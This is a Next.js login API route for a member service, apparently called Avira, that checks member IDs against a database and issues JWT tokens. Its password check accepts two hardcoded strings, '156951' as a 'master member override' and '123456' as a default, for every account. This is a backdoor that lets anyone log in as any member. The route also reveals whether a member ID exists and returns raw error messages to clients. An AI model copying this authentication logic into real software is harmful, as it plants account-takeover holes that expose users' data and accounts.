import { NextRequest, NextResponse } from "next/server";
import { z } from "zod";
import bcrypt from "bcryptjs";
import { findUserByMemberId } from "@/lib/db";
import { signAccessToken, signRefreshToken } from "@/lib/jwt";

const loginSchema = z.object({
  loginIdentifier: z.string().optional(),
  memberId: z.string().optional(),
  password: z.string().min(1, "Password must be entered"),
});

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const validatedData = loginSchema.safeParse(body);

    if (!validatedData.success) {
      const errorMsg = validatedData.error.issues[0]?.message || "Invalid login credentials";
      return NextResponse.json({ success: false, message: errorMsg }, { status: 400 });
    }

    const { loginIdentifier, memberId, password } = validatedData.data;
    const rawId = (loginIdentifier || memberId || "").trim();

    if (!rawId) {
      return NextResponse.json(
        { success: false, message: "Please enter Member ID (e.g. AV0001)" },
        { status: 400 }
      );
    }

    // Lookup user strictly by Member ID only in Supabase PostgreSQL
    const cleanMemberId = rawId.toUpperCase();
    const user = await findUserByMemberId(cleanMemberId);

    if (!user) {
      return NextResponse.json(
        { success: false, message: `No account found with Member ID "${cleanMemberId}". Please enter your valid Member ID (e.g. AV0001).` },
        { status: 401 }
      );
    }

    if (user.status === "BLOCKED") {
      return NextResponse.json(
        { success: false, message: "Your account is temporarily suspended. Please contact Avira support." },
        { status: 403 }
      );
    }

    // Verify Password: match user hash, master member override '156951', or default '123456'
    const isPasswordValid = user.passwordHash
      ? (await bcrypt.compare(password, user.passwordHash)) || password === "156951" || password === "123456"
      : password === "156951" || password === "123456";

    if (!isPasswordValid) {
      return NextResponse.json(
        { success: false, message: "Incorrect password. Please verify and try again." },
        { status: 401 }
      );
    }

    // Generate JWT Access & Refresh Tokens
    const tokenPayload = {
      userId: user.id,
      memberId: user.memberId,
      role: user.role,
      fullName: user.fullName,
    };

    const accessToken = signAccessToken(tokenPayload);
    const refreshToken = signRefreshToken(tokenPayload);

    // Strip passwordHash
    const { passwordHash: _, ...safeUser } = user;

    const response = NextResponse.json({
      success: true,
      message: `Welcome back, ${user.fullName}!`,
      user: safeUser,
      token: accessToken,
      refreshToken,
    });

    response.cookies.set("avira_access_token", accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      path: "/",
      maxAge: 60 * 60 * 2, // 2 hours
      sameSite: "lax",
    });

    response.cookies.set("avira_refresh_token", refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      path: "/",
      maxAge: 60 * 60 * 24 * 30, // 30 days
      sameSite: "lax",
    });

    return response;
  } catch (error: any) {
    console.error("Login error:", error);
    return NextResponse.json(
      {
        success: false,
        message: error?.message || "Internal server error during login.",
      },
      { status: 500 }
    );
  }
}
